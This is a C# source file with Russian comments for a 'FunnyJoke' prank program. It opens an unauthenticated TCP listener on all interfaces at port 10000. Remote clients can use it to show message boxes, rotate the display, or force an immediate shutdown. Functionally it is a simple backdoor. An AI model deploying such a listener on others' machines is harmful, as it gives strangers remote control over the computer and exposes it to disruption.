using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Text;

namespace FunnyJoke
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        /// 
        static int port = 10000;
        static IPAddress ipAddress = IPAddress.Parse("0.0.0.0");
        const byte codeMsg = 1;     // Оправить сообщение
        const byte codeRotate = 2;  // Повернуть экран
        const byte codePoff = 3;    // Выключить компьютер
        const byte repOK = 10;
        const byte repERR = 20;
        [STAThread]
        static void Main()
        {
            // Создаем локальную конечную точку
            IPEndPoint ipEndPoint = new IPEndPoint(ipAddress, port);
            // Создаем сокет
            Socket socket = new Socket(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);            
            try
            {
                // Связываем сокет с конечной точкой
                socket.Bind(ipEndPoint);
                // Переходим в режим "прослуивания" соединения
                socket.Listen(1);                
                // Ждем соединение. При удачном соедиениее создается новый экземпляр socket, связанный с этим соединением
                while (true)
                {
                    Socket handler = socket.Accept();
                    // Массив, где сохраняем приняятые данные.
                    byte[] recBytes = new byte[1024];
                    int nBytes = handler.Receive(recBytes);                    
                    switch (recBytes[0])    // Определяемся с командами клиента
                    {
                        case codeMsg:                            
                            nBytes = handler.Receive(recBytes); // Читаем данные сообщения
                            if (nBytes != 0)                    
                            {
                                String msg = Encoding.UTF8.GetString(recBytes, 0, nBytes);                                
                                MessageBox.Show(msg, "Привет Пупсик!");
                            }                                
                            break;
                        case codeRotate:
                            RotateScreen();                           
                            break;
                        case codePoff:
                            System.Diagnostics.Process p = new System.Diagnostics.Process();
                            p.StartInfo.FileName = "shutdown.exe";
                            p.StartInfo.Arguments = "-s -t 00";
                            p.Start();
                            socket.Close();                            
                            break;
                    }
                    // Освобождаем сокеты
                    handler.Shutdown(SocketShutdown.Both);
                    handler.Close();
                }              
                

            }
            catch (Exception ex)
            {                
            }

        }        
        static private void RotateScreen ()
        {
            NativeMethods.DEVMODE dm = NativeMethods.CreateDevmode();
            if (0 != NativeMethods.EnumDisplaySettings(null, NativeMethods.ENUM_CURRENT_SETTINGS, ref dm))
            {
                // swap width and height
                int temp = dm.dmPelsHeight;
                dm.dmPelsHeight = dm.dmPelsWidth;
                dm.dmPelsWidth = temp;
                switch (dm.dmDisplayOrientation)
                {
                    case NativeMethods.DMDO_DEFAULT:
                        dm.dmDisplayOrientation = NativeMethods.DMDO_270;
                        break;
                    case NativeMethods.DMDO_270:
                        dm.dmDisplayOrientation = NativeMethods.DMDO_180;
                        break;
                    case NativeMethods.DMDO_180:
                        dm.dmDisplayOrientation = NativeMethods.DMDO_90;
                        break;
                    case NativeMethods.DMDO_90:
                        dm.dmDisplayOrientation = NativeMethods.DMDO_DEFAULT;
                        break;
                    default:                     
                        break;
                }
                int iRet = NativeMethods.ChangeDisplaySettings(ref dm, 0);

            }
        }
    }
}
